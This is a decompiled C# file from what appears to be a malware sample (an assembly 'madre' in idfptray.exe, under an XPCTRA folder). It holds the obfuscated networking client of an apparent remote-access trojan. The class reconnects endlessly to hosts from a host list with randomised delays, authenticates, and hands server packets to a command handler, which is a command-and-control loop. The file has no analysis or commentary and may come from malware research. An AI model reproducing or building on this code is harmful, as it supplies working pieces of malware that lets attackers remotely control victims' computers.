// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Networking.xxxxxcliente
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using VERMELHO265MONARCA.Config;
using VERMELHO265MONARCA.Core.Commands;
using VERMELHO265MONARCA.Core.Data;
using VERMELHO265MONARCA.Core.NetSerializer;
using VERMELHO265MONARCA.Core.Packets;
using VERMELHO265MONARCA.Core.Packets.ServerPackets;
using VERMELHO265MONARCA.Core.Utilities;
using Xpctra;

namespace VERMELHO265MONARCA.Core.Networking
{
  public class xxxxxcliente : Client
  {
    private readonly HostsManager _hosts;

    public static bool Exiting { get; private set; }

    public bool Authenticated { get; private set; }

    public xxxxxcliente(HostsManager hostsManager)
    {
      this._hosts = hostsManager;
      this.Serializer = new Serializer((IEnumerable<System.Type>) PacketRegistery.GetPacketTypes());
      this.ClientState += new Client.ClientStateEventHandler(this.OnClientState);
      this.ClientRead += new Client.ClientReadEventHandler(this.OnClientRead);
      this.ClientFail += new Client.ClientFailEventHandler(this.OnClientFail);
    }

    public void Connect()
    {
      while (!xxxxxcliente.Exiting)
      {
        if (!this.Connected)
        {
          Thread.Sleep(100 + new Random().Next(0, 250));
          Host nextHost = this._hosts.GetNextHost();
          this.Connect(nextHost.IpAddress, nextHost.Port);
          Thread.Sleep(200);
          Application.DoEvents();
        }
        while (this.Connected)
        {
          Application.DoEvents();
          Thread.Sleep(2500);
        }
        if (xxxxxcliente.Exiting)
        {
          xxxxxcliente.Exiting = false;
          break;
        }
        Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
      }
    }

    private void OnClientRead(Client client, IPacket packet)
    {
      System.Type type = packet.GetType();
      if (!this.Authenticated)
      {
        if (type == typeof (GetAuthentication))
        {
          CALHAMBEQUE892INFLAMATORIO.HandleGetAuthentication((GetAuthentication) packet, client);
        }
        else
        {
          if (type != typeof (SetAuthenticationSuccess))
            return;
          this.Authenticated = true;
        }
      }
      else
        PacketHandler.HandlePacket(client, packet);
    }

    private void OnClientFail(Client client, Exception ex)
    {
      Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
      client.Disconnect();
    }

    private void OnClientState(Client client, bool connected)
    {
      this.Authenticated = false;
      if (connected || xxxxxcliente.Exiting)
        return;
      this.LostConnection();
    }

    private void LostConnection()
    {
    }

    public void Exit()
    {
      ClassConexao.Exiting = true;
      xxxxxcliente.Exiting = true;
      this.Disconnect();
    }
  }
}
